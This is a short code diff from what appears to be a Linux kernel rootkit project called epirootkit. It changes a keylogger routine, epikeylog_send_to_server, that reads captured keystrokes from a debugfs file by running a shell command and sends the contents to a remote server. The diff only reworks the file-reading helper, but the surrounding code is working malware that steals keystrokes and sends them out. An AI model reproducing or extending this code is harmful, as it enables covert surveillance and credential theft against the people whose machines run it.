@@ -7,6 +7,7 @@
 #include <linux/moduleparam.h>
 
 #include "epirootkit.h"
+#include "io.h"
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12             /* Encoded 'keycode shift' chunk length */
@@ -261,9 +262,11 @@ int epikeylog_send_to_server(void) {
         return -EBUSY;
     }
     exec_str_as_command("cat /sys/kernel/debug/kisni/keys", true);
-    // Send the result back to the server
+    
     int readed_size = 0;
-    char *keys_content = read_file(STDOUT_FILE, &readed_size);
+    char *keys_content;
+    readed_size = _read_file(STDOUT_FILE, &keys_content);
+
     int ret_code = send_to_server_raw(keys_content, readed_size);
     DBG_MSG("epikeylog_send_to_server: keylogger content sent\n");
     return ret_code;
